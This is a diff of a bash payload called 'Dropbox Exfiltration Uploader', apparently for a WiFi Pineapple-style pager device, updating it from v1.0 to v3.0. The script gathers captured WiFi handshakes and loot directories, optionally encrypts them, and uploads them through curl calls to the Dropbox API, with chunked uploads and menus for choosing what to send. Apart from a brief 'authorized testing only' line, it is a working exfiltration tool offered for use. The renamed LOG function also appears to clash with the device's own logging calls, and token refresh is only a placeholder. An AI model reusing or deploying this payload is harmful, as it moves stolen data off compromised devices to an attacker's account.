@@ -1,13 +1,18 @@
 #!/bin/bash
-# Title: Dropbox Exfiltration Uploader
+# Title: Dropbox Exfiltration Uploader v3.0
 # Description: Upload collected data to Dropbox with OAuth2 authentication
 # Author: macr0hack422
-# Version: 1.0
+# Version: 3.0
 # Category: Exfiltration
 #
 # This payload provides secure data exfiltration to Dropbox using the official
 # Dropbox API v2 with OAuth2 authentication. Files are uploaded to a specific
 # folder in the user's Dropbox account.
+#
+# v3.0 Changes:
+# - Simplified menu system using NUMBER_PICKER (like SSID Chaos)
+# - Cleaner Pager GUI integration
+# - Maintains v2.0 compatibility shim
 #
 # Features:
 # - OAuth2 authentication flow (with app folder access for security)
@@ -25,10 +30,9 @@
 #    - Choose "App Folder" access for security (recommended)
 #    - Enable scopes: files.content.write, files.content.read
 # 2. Scroll to "Generated access token" section and click "Generate"
-# 3. Copy the token and paste it into the ACCESS_TOKEN variable below (line 57)
+# 3. Copy the token and paste it into the ACCESS_TOKEN variable below
 # 4. That's it! The token never expires (unless you revoke it)
 #
-# ALTERNATIVE: Run get_dropbox_token.py on your PC for step-by-step help
 #
 # IMPORTANT: For authorized security testing only.
 # Keep your access token secret - don't share the payload with the token in it.
@@ -48,22 +52,16 @@ CONTENT_BASE="https://content.dropboxapi.com"
 AUTH_URL="https://www.dropbox.com/oauth2/authorize"
 TOKEN_URL="https://api.dropboxapi.com/oauth2/token"
 
-# Dropbox app credentials (NOT NEEDED - use access token method below)
-# APP_KEY="your_app_key_here"
-# APP_SECRET="your_app_secret_here"
-APP_KEY=""
-APP_SECRET=""
-
-# Pre-generated access token (RECOMMENDED - easiest method)
+# Access token (paste from Dropbox developer page)
 # Generate at: https://www.dropbox.com/developers/apps
-# 1. Create app (Scoped App, App Folder)
-# 2. Enable permissions: files.content.write + files.content.read
-# 3. Scroll to "Generated access token" and click "Generate"
-# 4. Paste token below OR use the [DOWN] menu option on the Pager
+# 1. Open your app (Scoped App, App Folder)
+# 2. Scroll to "Generated access token"
+# 3. Click "Generate" button
+# 4. Paste token below between the quotes
 ACCESS_TOKEN=""
 
 # Upload settings
-DROPBOX_APP_NAME="WiFi Pineapple"  # Name of your Dropbox app (for reference)
+DROPBOX_APP_NAME="pager"  # Name of your Dropbox app (for reference)
 DROPBOX_ROOT="/"              # Root path in app folder (usually "/" for app folder access)
 DROPBOX_PATH="/Pineapple"      # Subfolder for uploads (will be created in app folder)
 CHUNK_SIZE=10485760           # 10MB chunks (Dropbox recommends 8-16MB)
@@ -80,7 +78,7 @@ ENCRYPTION_ALGO="aes-256-cbc"
 mkdir -p "$UPLOAD_DIR"
 
 # Logging function
-log_msg() {
+LOG() {
     local level="$1"
     shift
     local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
@@ -88,12 +86,12 @@ log_msg() {
 }
 
 # Initialize log
-log_msg "INFO" "==========================================="
-log_msg "INFO" "Dropbox Exfiltration Payload v1.0"
-log_msg "INFO" "Initializing..."
-log_msg "INFO" "Upload directory: $UPLOAD_DIR"
-log_msg "INFO" "Token file: $TOKEN_FILE"
-log_msg "INFO" "==========================================="
+LOG "INFO" "==========================================="
+LOG "INFO" "Dropbox Exfiltration Payload v3.0"
+LOG "INFO" "Initializing..."
+LOG "INFO" "Upload directory: $UPLOAD_DIR"
+LOG "INFO" "Token file: $TOKEN_FILE"
+LOG "INFO" "==========================================="
 
 # ============================================
 # AUTHENTICATION
@@ -105,7 +103,7 @@ save_token() {
     local refresh_token="$2"
     local expires_in="$3"
 
-    log_msg "INFO" "Saving access token to $TOKEN_FILE"
+    LOG "INFO" "Saving access token to $TOKEN_FILE"
 
     local expiry_time
     expiry_time=$(($(date +%s) + expires_in - 300))  # Refresh 5 min early
@@ -117,7 +115,7 @@ EXPIRES_AT="$expiry_time"
 EOF
 
     chmod 600 "$TOKEN_FILE"
-    log_msg "SUCCESS" "Token saved successfully (expires at $(date -d @$expiry_time -Is 2>/dev/null || echo 'unknown'))"
+    LOG "SUCCESS" "Token saved successfully (expires at $(date -d @$expiry_time -Is 2>/dev/null || echo 'unknown'))"
 }
 
 # Load saved token
@@ -128,10 +126,10 @@ load_token() {
         return 0
     fi
 
-    log_msg "INFO" "Loading saved token from $TOKEN_FILE"
+    LOG "INFO" "Loading saved token from $TOKEN_FILE"
 
     if [ ! -f "$TOKEN_FILE" ]; then
-        log_msg "ERROR" "Token file not found"
+        LOG "ERROR" "Token file not found"
         return 1
     fi
 
@@ -139,7 +137,7 @@ load_token() {
     if command -v jq >/dev/null 2>&1; then
         local token=$(jq -r '.access_token' "$TOKEN_FILE" 2>/dev/null)
         if [ -n "$token" ] && [ "$token" != "null" ]; then
-            log_msg "SUCCESS" "Token loaded (JSON format)"
+            LOG "SUCCESS" "Token loaded (JSON format)"
             printf '%s' "$token"
             return 0
         fi
@@ -153,32 +151,32 @@ load_token() {
     now=$(date +%s)
 
     if [ -n "$EXPIRES_AT" ] && [ $now -ge $EXPIRES_AT ]; then
-        log_msg "WARN" "Token expired (expired at $(date -d @$EXPIRES_AT -Is 2>/dev/null || echo 'unknown')), attempting refresh..."
+        LOG "WARN" "Token expired (expired at $(date -d @$EXPIRES_AT -Is 2>/dev/null || echo 'unknown')), attempting refresh..."
         refresh_access_token
         source "$TOKEN_FILE"
     fi
 
-    log_msg "SUCCESS" "Token loaded successfully"
+    LOG "SUCCESS" "Token loaded successfully"
     printf '%s' "$ACCESS_TOKEN"
     return 0
 }
 
 # Refresh access token using refresh token
 refresh_access_token() {
-    log_msg "INFO" "Attempting to refresh access token"
+    LOG "INFO" "Attempting to refresh access token"
 
     if [ ! -f "$TOKEN_FILE" ]; then
-        log_msg "ERROR" "Cannot refresh: token file not found"
+        LOG "ERROR" "Cannot refresh: token file not found"
         return 1
     fi
 
     source "$TOKEN_FILE"
 
-    log_msg "INFO" "Refresh token: ${REFRESH_TOKEN:0:8}..."
+    LOG "INFO" "Refresh token: ${REFRESH_TOKEN:0:8}..."
 
     # Note: Dropbox refresh tokens require app with appropriate permissions
     # This is a placeholder - actual implementation depends on app type
-    log_msg "WARN" "Automatic token refresh not available, manual re-authorization required"
+    LOG "WARN" "Automatic token refresh not available, manual re-authorization required"
     LOG yellow "Token refresh - please re-authorize"
     return 1
 }
@@ -198,8 +196,8 @@ exchange_code_for_token() {
     local app_secret="$2"
     local code="$3"
 
-    log_msg "INFO" "Exchanging authorization code for access token"
-    log_msg "INFO" "Code: ${code:0:8}..."
+    LOG "INFO" "Exchanging authorization code for access token"
+    LOG "INFO" "Code: ${code:0:8}..."
 
     local response
     response=$(curl -s -X POST "$TOKEN_URL" \
@@ -207,13 +205,13 @@ exchange_code_for_token() {
         -d "code=$code" \
         -d "grant_type=authorization_code")
 
-    log_msg "DEBUG" "Token exchange response: $response"
+    LOG "DEBUG" "Token exchange response: $response"
 
     local access_token
     access_token=$(echo "$response" | grep -o '"access_token":"[^"]*' | cut -d'"' -f4)
 
     if [ -n "$access_token" ]; then
-        log_msg "SUCCESS" "Access token received: ${access_token:0:8}..."
+        LOG "SUCCESS" "Access token received: ${access_token:0:8}..."
 
         # Note: Refresh tokens only available for specific app types
         local refresh_token
@@ -221,22 +219,22 @@ exchange_code_for_token() {
         refresh_token="${refresh_token:-none}"
 
         if [ "$refresh_token" != "none" ]; then
-            log_msg "INFO" "Refresh token received: ${refresh_token:0:8}..."
+            LOG "INFO" "Refresh token received: ${refresh_token:0:8}..."
         else
-            log_msg "INFO" "No refresh token (app may not support offline access)"
+            LOG "INFO" "No refresh token (app may not support offline access)"
         fi
 
         local expires_in
         expires_in=$(echo "$response" | grep -o '"expires_in":[0-9]*' | cut -d':' -f2)
         expires_in="${expires_in:-14400}"  # Default 4 hours
 
-        log_msg "INFO" "Token expires in: ${expires_in}s ($((expires_in / 3600))h)"
+        LOG "INFO" "Token expires in: ${expires_in}s ($((expires_in / 3600))h)"
 
         save_token "$access_token" "$refresh_token" "$expires_in"
         return 0
     else
-        log_msg "ERROR" "Failed to get access token from Dropbox"
-        log_msg "ERROR" "API response: $response"
+        LOG "ERROR" "Failed to get access token from Dropbox"
+        LOG "ERROR" "API response: $response"
         LOG red "Failed to get access token"
         LOG "Response: $response"
         return 1
@@ -247,7 +245,7 @@ exchange_code_for_token() {
 check_token() {
     local token="$1"
 
-    log_msg "INFO" "Validating access token..."
+    LOG "INFO" "Validating access token..."
 
     local response
     response=$(curl -s -X POST "$API_BASE/2/users/get_current_account" \
@@ -256,10 +254,10 @@ check_token() {
     if echo "$response" | grep -q '"email"'; then
         local email
         email=$(echo "$response" | grep -o '"email":"[^"]*' | cut -d'"' -f4)
-        log_msg "SUCCESS" "Token validation successful (account: $email)"
+        LOG "SUCCESS" "Token validation successful (account: $email)"
         return 0
     else
-        log_msg "ERROR" "Token validation failed: $response"
+        LOG "ERROR" "Token validation failed: $response"
         return 1
     fi
 }
@@ -306,21 +304,21 @@ upload_file_simple() {
 
     # Encrypt if key is set
     if [ -n "$ENCRYPTION_KEY" ]; then
-        log_msg "INFO" "Encrypting file before upload..."
+        LOG "INFO" "Encrypting file before upload..."
         LOG "Encrypting file..."
         if ! encrypt_file "$local_path" "$encrypted_file"; then
-            log_msg "ERROR" "Encryption failed for $local_path"
+            LOG "ERROR" "Encryption failed for $local_path"
             LOG red "Encryption failed"
             return 1
         fi
         local_path="$encrypted_file"
-        log_msg "SUCCESS" "File encrypted successfully"
+        LOG "SUCCESS" "File encrypted successfully"
     fi
 
     # Add .enc extension if encrypted
     [ -n "$ENCRYPTION_KEY" ] && remote_path="${remote_path}.enc"
 
-    log_msg "DEBUG" "Starting simple upload to: $remote_path (mode: $mode)"
+    LOG "DEBUG" "Starting simple upload to: $remote_path (mode: $mode)"
 
     local response
     response=$(curl -s -X POST "$CONTENT_BASE/2/files/upload" \
@@ -332,11 +330,11 @@ upload_file_simple() {
     rm -f "$encrypted_file"
 
     if echo "$response" | grep -q '"name"'; then
-        log_msg "SUCCESS" "File uploaded successfully: $remote_path"
+        LOG "SUCCESS" "File uploaded successfully: $remote_path"
         return 0
     else
-        log_msg "ERROR" "Upload failed for $remote_path"
-        log_msg "ERROR" "API response: $response"
+        LOG "ERROR" "Upload failed for $remote_path"
+        LOG "ERROR" "API response: $response"
         LOG red "Upload failed: $response"
         return 1
     fi
@@ -360,23 +358,23 @@ start_upload_session() {
         file_size=$(ls -l "$local_path" 2>/dev/null | awk '{print $5}')
     fi
 
-    log_msg "INFO" "Starting chunked upload session for file ($file_size bytes)"
+    LOG "INFO" "Starting chunked upload session for file ($file_size bytes)"
 
     local encrypted_file="/tmp/dropbox_upload_${SESSION_ID}.enc"
 
     # Encrypt if needed
     if [ -n "$ENCRYPTION_KEY" ]; then
-        log_msg "INFO" "Encrypting file for chunked upload..."
+        LOG "INFO" "Encrypting file for chunked upload..."
         if ! encrypt_file "$local_path" "$encrypted_file" 2>/dev/null; then
-            log_msg "ERROR" "Encryption failed for chunked upload"
+            LOG "ERROR" "Encryption failed for chunked upload"
             return 1
         fi
         local_path="$encrypted_file"
-        log_msg "SUCCESS" "File encrypted for chunked upload"
+        LOG "SUCCESS" "File encrypted for chunked upload"
     fi
 
     # Start session with first chunk
-    log_msg "INFO" "Uploading first chunk ($CHUNK_SIZE bytes)..."
+    LOG "INFO" "Uploading first chunk ($CHUNK_SIZE bytes)..."
 
     local response
     response=$(head -c "$CHUNK_SIZE" "$local_path" | \
@@ -392,12 +390,12 @@ start_upload_session() {
     rm -f "$encrypted_file"
 
     if [ -n "$session_id" ]; then
-        log_msg "SUCCESS" "Upload session started: ${session_id:0:16}..."
+        LOG "SUCCESS" "Upload session started: ${session_id:0:16}..."
         printf '%s' "$session_id"
         return 0
     else
-        log_msg "ERROR" "Failed to start upload session"
-        log_msg "ERROR" "API response: $response"
+        LOG "ERROR" "Failed to start upload session"
+        LOG "ERROR" "API response: $response"
         return 1
     fi
 }
@@ -413,7 +411,7 @@ append_chunk() {
     local chunk
     chunk=$(tail -c +"$((offset + 1))" "$local_path" | head -c "$CHUNK_SIZE")
 
-    log_msg "DEBUG" "Appending chunk at offset $offset ($CHUNK_SIZE bytes)"
+    LOG "DEBUG" "Appending chunk at offset $offset ($CHUNK_SIZE bytes)"
 
     local response
     response=$(echo -n "$chunk" | \
@@ -424,8 +422,8 @@ append_chunk() {
         --data-binary @-)
 
     if ! echo "$response" | grep -q '"null"' && ! echo "$response" | grep -q '"result":null'; then
-        log_msg "ERROR" "Chunk append failed at offset $offset"
-        log_msg "ERROR" "API response: $response"
+        LOG "ERROR" "Chunk append failed at offset $offset"
+        LOG "ERROR" "API response: $response"
         LOG red "Chunk append failed: $response"
         return 1
     fi
@@ -455,10 +453,10 @@ finish_upload_session() {
 
     [ -n "$ENCRYPTION_KEY" ] && remote_path="${remote_path}.enc"
 
-    log_msg "INFO" "Finishing chunked upload session"
-    log_msg "INFO" "Session ID: ${session_id:0:16}..."
-    log_msg "INFO" "Final path: $remote_path"
-    log_msg "DEBUG" "Total size: $file_size bytes"
+    LOG "INFO" "Finishing chunked upload session"
+    LOG "INFO" "Session ID: ${session_id:0:16}..."
+    LOG "INFO" "Final path: $remote_path"
+    LOG "DEBUG" "Total size: $file_size bytes"
 
     local response
     response=$(curl -s -X POST "$CONTENT_BASE/2/files/upload_session/finish" \
@@ -468,11 +466,11 @@ finish_upload_session() {
         --data-binary "")
 
     if echo "$response" | grep -q '"name"'; then
-        log_msg "SUCCESS" "Chunked upload completed successfully: $remote_path"
+        LOG "SUCCESS" "Chunked upload completed successfully: $remote_path"
         return 0
     else
-        log_msg "ERROR" "Failed to finish chunked upload"
-        log_msg "ERROR" "API response: $response"
+        LOG "ERROR" "Failed to finish chunked upload"
+        LOG "ERROR" "API response: $response"
         LOG red "Finish upload failed: $response"
         return 1
     fi
@@ -500,42 +498,42 @@ upload_file() {
     # Default to small file if we can't determine size
     if [ -z "$file_size" ]; then
         file_size=0
-        log_msg "WARN" "Could not determine file size, assuming small file"
+        LOG "WARN" "Could not determine file size, assuming small file"
     fi
 
     local filename=$(basename "$local_path")
 
-    log_msg "INFO" "Starting upload: $filename ($file_size bytes)"
-    log_msg "INFO" "Remote path: $remote_path"
+    LOG "INFO" "Starting upload: $filename ($file_size bytes)"
+    LOG "INFO" "Remote path: $remote_path"
 
     local start_time=$(date +%s)
 
     if [ $file_size -le $MAX_SINGLE_SIZE ] && [ $file_size -gt 0 ]; then
         # Simple upload
-        log_msg "INFO" "Using simple upload (file < 150MB)"
+        LOG "INFO" "Using simple upload (file < 150MB)"
 
         if upload_file_simple "$token" "$local_path" "$remote_path"; then
             local end_time=$(date +%s)
             local duration=$((end_time - start_time))
             if [ $duration -gt 0 ]; then
                 local speed=$((file_size / duration))
-                log_msg "SUCCESS" "Upload complete in ${duration}s ($speed bytes/s)"
+                LOG "SUCCESS" "Upload complete in ${duration}s ($speed bytes/s)"
             else
-                log_msg "SUCCESS" "Upload complete"
+                LOG "SUCCESS" "Upload complete"
             fi
             return 0
         else
-            log_msg "ERROR" "Simple upload failed"
+            LOG "ERROR" "Simple upload failed"
             return 1
         fi
     else
         # Chunked upload
-        log_msg "INFO" "Large file detected, using chunked upload (>150MB)"
+        LOG "INFO" "Large file detected, using chunked upload (>150MB)"
 
         local session_id
         session_id=$(start_upload_session "$token" "$local_path") || return 1
 
-        log_msg "INFO" "Session started: $session_id"
+        LOG "INFO" "Session started: $session_id"
 
         # Upload remaining chunks
         local offset=$CHUNK_SIZE
@@ -547,7 +545,7 @@ upload_file() {
             LOG "Uploading chunk $chunk_num/$total_chunks ($percent%)..."
 
             if ! append_chunk "$token" "$session_id" "$local_path" "$offset"; then
-                log_msg "ERROR" "Chunk upload failed at chunk $chunk_num"
+                LOG "ERROR" "Chunk upload failed at chunk $chunk_num"
                 return 1
             fi
 
@@ -560,10 +558,10 @@ upload_file() {
             local end_time=$(date +%s)
             local duration=$((end_time - start_time))
             local speed=$((file_size / duration))
-            log_msg "SUCCESS" "Chunked upload complete: ${total_chunks} chunks in ${duration}s ($speed bytes/s)"
+            LOG "SUCCESS" "Chunked upload complete: ${total_chunks} chunks in ${duration}s ($speed bytes/s)"
             return 0
         else
-            log_msg "ERROR" "Failed to finish upload session"
+            LOG "ERROR" "Failed to finish upload session"
             return 1
         fi
     fi
@@ -576,11 +574,11 @@ upload_directory() {
     local remote_dir="$3"
 
     local dirname=$(basename "$local_dir")
-    log_msg "INFO" "Starting directory upload: $dirname"
-    log_msg "INFO" "Local: $local_dir"
-    log_msg "INFO" "Remote: $remote_dir"
+    LOG "INFO" "Starting directory upload: $dirname"
+    LOG "INFO" "Local: $local_dir"
+    LOG "INFO" "Remote: $remote_dir"
 
-    log_msg "DEBUG" "Counting files in directory..."
+    LOG "DEBUG" "Counting files in directory..."
     local file_count=0
     local success_count=0
     local total_size=0
@@ -605,14 +603,14 @@ upload_directory() {
             # Default to 0 if all methods fail
             fsize=${fsize:-0}
             total_size=$((total_size + fsize))
-            log_msg "DEBUG" "Found file: $(basename "$file") ($fsize bytes)"
+            LOG "DEBUG" "Found file: $(basename "$file") ($fsize bytes)"
         fi
     done
 
-    log_msg "INFO" "Found $file_count files ($total_size bytes total)"
+    LOG "INFO" "Found $file_count files ($total_size bytes total)"
 
     if [ $file_count -eq 0 ]; then
-        log_msg "WARN" "No files found in directory"
+        LOG "WARN" "No files found in directory"
         LOG yellow "No files to upload"
         return 1
     fi
@@ -627,15 +625,15 @@ upload_directory() {
             local remote_path="$remote_dir/$filename"
 
             LOG "[$current_file/$file_count] Uploading: $filename"
-            log_msg "INFO" "Uploading file $current_file/$file_count: $filename"
+            LOG "INFO" "Uploading file $current_file/$file_count: $filename"
 
             if upload_file "$token" "$file" "$remote_path"; then
                 ((success_count++))
                 LOG green "  ✓ Success"
-                log_msg "SUCCESS" "Uploaded: $filename"
+                LOG "SUCCESS" "Uploaded: $filename"
             else
                 LOG red "  ✗ Failed"
-                log_msg "ERROR" "Failed to upload: $filename"
+                LOG "ERROR" "Failed to upload: $filename"
             fi
         fi
     done
@@ -643,8 +641,8 @@ upload_directory() {
     local end_time=$(date +%s)
     local duration=$((end_time - start_time))
 
-    log_msg "INFO" "Directory upload complete: $success_count/$file_count files"
-    log_msg "INFO" "Duration: ${duration}s, Total size: $total_size bytes"
+    LOG "INFO" "Directory upload complete: $success_count/$file_count files"
+    LOG "INFO" "Duration: ${duration}s, Total size: $total_size bytes"
 
     return 0
 }
@@ -654,7 +652,7 @@ create_folder() {
     local token="$1"
     local path="$2"
 
-    log_msg "INFO" "Creating Dropbox folder: $path"
+    LOG "INFO" "Creating Dropbox folder: $path"
 
     local response
     response=$(curl -s -X POST "$API_BASE/2/files/create_folder_v2" \
@@ -663,10 +661,10 @@ create_folder() {
         -d "{\"path\":\"$path\",\"autorename\":false}")
 
     if echo "$response" | grep -q '"name"'; then
-        log_msg "SUCCESS" "Folder created: $path"
+        LOG "SUCCESS" "Folder created: $path"
         return 0
     elif echo "$response" | grep -q '"error".*path.*not_found'; then
-        log_msg "INFO" "Parent folder doesn't exist, attempting to create parents..."
+        LOG "INFO" "Parent folder doesn't exist, attempting to create parents..."
         # Extract parent path
         local parent_path="${path%/*}"
         if [ "$parent_path" != "$path" ]; then
@@ -674,10 +672,10 @@ create_folder() {
             create_folder "$token" "$path"
         fi
     elif echo "$response" | grep -q '"error".*path.*conflict'; then
-        log_msg "INFO" "Folder already exists: $path"
+        LOG "INFO" "Folder already exists: $path"
         return 0
     else
-        log_msg "WARN" "Failed to create folder: $response"
+        LOG "WARN" "Failed to create folder: $response"
         return 1
     fi
 }
@@ -688,35 +686,36 @@ create_folder() {
 
 # Get source to upload
 get_source() {
-    LOG ""
-    LOG cyan "Select source:"
-    LOG "  " green "[1]" "Handshakes directory"
-    LOG "  " green "[2]" "Loot directory"
-    LOG "  " green "[3]" "Custom file"
-    LOG "  " green "[4]" "Custom directory"
-    LOG ""
-    LOG yellow "Use D-pad to select:"
-    LOG "  " green "UP"    " = Option 1"
-    LOG "  " green "RIGHT" " = Option 2"
-    LOG "  " green "DOWN"  " = Option 3"
-    LOG "  " green "LEFT"  " = Option 4"
-    LOG ""
+    PROMPT "SELECT UPLOAD SOURCE
+
+1. Handshakes directory
+2. Loot directory
+3. Custom file
+4. Custom directory
+0. Back to main menu"
 
     local choice
-    choice=$(WAIT_FOR_INPUT)
+    choice=$(NUMBER_PICKER "Select option" 1)
 
     case "$choice" in
-        UP) echo "/root/loot/handshakes" ;;
-        RIGHT) echo "/root/loot" ;;
-        DOWN)
+        1)
+            echo "/root/loot/handshakes"
+            ;;
+        2)
+            echo "/root/loot"
+            ;;
+        3)
             local path
             path=$(TEXT_PICKER "File Path" "/root/loot/data.txt")
             echo "$path"
             ;;
-        LEFT)
+        4)
             local path
             path=$(TEXT_PICKER "Directory Path" "/root/loot")
             echo "$path"
+            ;;
+        0)
+            echo ""
             ;;
         *)
             echo ""
@@ -732,11 +731,11 @@ main_upload() {
 
     SESSION_ID=$(date '+%Y%m%d%H%M%S')
 
-    log_msg "INFO" "==========================================="
-    log_msg "INFO" "Starting upload session: $SESSION_ID"
-    log_msg "INFO" "Source: $source"
-    log_msg "INFO" "Destination: $remote_folder"
-    log_msg "INFO" "==========================================="
+    LOG "INFO" "==========================================="
+    LOG "INFO" "Starting upload session: $SESSION_ID"
+    LOG "INFO" "Source: $source"
+    LOG "INFO" "Destination: $remote_folder"
+    LOG "INFO" "==========================================="
 
     LOG ""
     LOG "╔════════════════════════════════════════╗"
@@ -749,15 +748,15 @@ main_upload() {
 
     # Verify source exists
     if [ ! -e "$source" ]; then
-        log_msg "ERROR" "Source not found: $source"
+        LOG "ERROR" "Source not found: $source"
         ERROR_DIALOG "Source not found"
         return 1
     fi
 
-    log_msg "INFO" "Source verified, proceeding with upload"
+    LOG "INFO" "Source verified, proceeding with upload"
 
     # Ensure remote folder exists
-    log_msg "INFO" "Ensuring remote folder exists: $remote_folder"
+    LOG "INFO" "Ensuring remote folder exists: $remote_folder"
     create_folder "$token" "$remote_folder"
 
     local session_start=$(date +%s)
@@ -767,13 +766,13 @@ main_upload() {
     if [ -f "$source" ]; then
         local filename
         filename=$(basename "$source")
-        log_msg "INFO" "File upload detected: $filename"
+        LOG "INFO" "File upload detected: $filename"
         upload_file "$token" "$source" "$remote_folder/$filename"
         result=$?
     elif [ -d "$source" ]; then
         local dirname
         dirname=$(basename "$source")
-        log_msg "INFO" "Directory upload detected: $dirname"
+        LOG "INFO" "Directory upload detected: $dirname"
         upload_directory "$token" "$source" "$remote_folder/$dirname"
         result=$?
     fi
@@ -781,8 +780,8 @@ main_upload() {
     local session_end=$(date +%s)
     local session_duration=$((session_end - session_start))
 
-    log_msg "INFO" "Upload session completed in ${session_duration}s"
-    log_msg "INFO" "Result: $([ $result -eq 0 ] && echo 'SUCCESS' || echo 'FAILED')"
+    LOG "INFO" "Upload session completed in ${session_duration}s"
+    LOG "INFO" "Result: $([ $result -eq 0 ] && echo 'SUCCESS' || echo 'FAILED')"
 
     # Log session
     {
@@ -803,46 +802,38 @@ main_upload() {
 
 main_menu() {
     while true; do
-        clear
-        LOG ""
-        LOG green "╔════════════════════════════════════════╗"
-        LOG green "║   DROPBOX EXFILTRATION v1.0          ║"
-        LOG green "║   Author: macr0hack422               ║"
-        LOG green "╚════════════════════════════════════════╝"
-        LOG ""
-
         # Check for saved token or pre-configured token
+        local token_status="[ ] No token - edit script to add ACCESS_TOKEN"
         if [ -n "$ACCESS_TOKEN" ]; then
-            LOG green "[✓] Access token configured in script"
+            token_status="[✓] Access token configured"
         elif [ -f "$TOKEN_FILE" ]; then
-            LOG green "[✓] Token file found"
-        else
-            LOG yellow "[ ] No token found - configure first"
+            token_status="[✓] Token file found"
         fi
 
-        LOG ""
-        LOG cyan "Options:"
-        LOG "  " green "[UP]"    "Upload files/folders"
-        LOG "  " green "[DOWN]"  "Setup access token"
-        LOG "  " green "[RIGHT]" "View upload log"
-        LOG "  " red "[B]"       "Exit"
-        LOG ""
+        PROMPT "DROPBOX EXFILTRATION v3.0
+Author: macr0hack422
 
-        local btn
-        btn=$(WAIT_FOR_INPUT)
+$token_status
 
-        case "$btn" in
-            UP)
+1. Upload files/folders
+2. View upload log
+0. Exit"
+
+        local choice
+        choice=$(NUMBER_PICKER "Select option" 1)
+
+        case "$choice" in
+            1)
                 local token
                 token=$(load_token)
 
                 if [ $? -ne 0 ]; then
-                    ERROR_DIALOG "Not authenticated"
+                    ERROR_DIALOG "Not authenticated - edit script to add ACCESS_TOKEN"
                     continue
                 fi
 
                 if ! check_token "$token"; then
-                    ERROR_DIALOG "Token invalid"
+                    ERROR_DIALOG "Token invalid - edit script to fix ACCESS_TOKEN"
                     continue
                 fi
 
@@ -856,71 +847,18 @@ main_menu() {
 
                 PROMPT "Press any key to continue..."
                 ;;
-            DOWN)
-                # Token setup - go directly to token configuration
-                LOG ""
-                LOG cyan "Authentication Setup"
-                LOG "────────────────────"
-                LOG ""
-                LOG green "Generate an access token from Dropbox:"
-                LOG ""
-                LOG "  " cyan "1." " Go to: https://www.dropbox.com/developers/apps"
-                LOG "  " cyan "2." " Create or select your app (Scoped App, App Folder)"
-                LOG "  " cyan "3." " Enable permissions: files.content.write + files.content.read"
-                LOG "  " cyan "4." " Scroll to 'Generated access token' section"
-                LOG "  " cyan "5." " Click 'Generate' and copy the token"
-                LOG ""
-                LOG yellow "Press any key to continue..."
-                WAIT_FOR_INPUT >/dev/null
+            2)
+                PROMPT "UPLOAD HISTORY
 
-                LOG ""
-                LOG green "╔════════════════════════════════════════╗"
-                LOG green "║   ACCESS TOKEN SETUP                  ║"
-                LOG green "╚════════════════════════════════════════╝"
-                LOG ""
-                LOG cyan "Paste your access token below:"
+$(if [ -f "$SESSION_LOG" ]; then
+    tail -20 "$SESSION_LOG"
+else
+    echo "No upload history"
+fi)
 
-                local access_token
-                access_token=$(TEXT_PICKER "Access Token" "")
-
-                if [ -z "$access_token" ]; then
-                    log_msg "INFO" "Authentication cancelled: no token entered"
-                    LOG yellow "No token entered"
-                    continue
-                fi
-
-                log_msg "INFO" "Access token entered, validating..."
-
-                # Validate token
-                LOG "Validating token..."
-                if check_token "$access_token"; then
-                    # Save token
-                    echo "{\"access_token\":\"$access_token\",\"expires_in\":0}" > "$TOKEN_FILE"
-                    log_msg "SUCCESS" "Access token saved successfully"
-                    LOG green "Authentication successful!"
-                    sleep 2
-                else
-                    log_msg "ERROR" "Access token validation failed"
-                    LOG red "Token validation failed"
-                    sleep 2
-                fi
+Press any key to continue..."
                 ;;
-            RIGHT)
-                clear
-                LOG ""
-                LOG cyan "Upload History"
-                LOG "──────────────"
-                LOG ""
-
-                if [ -f "$SESSION_LOG" ]; then
-                    tail -20 "$SESSION_LOG"
-                else
-                    LOG yellow "No upload history"
-                fi
-
-                PROMPT "Press any key to continue..."
-                ;;
-            B)
+            0)
                 LOG ""
                 LOG yellow "Exiting..."
                 exit 0
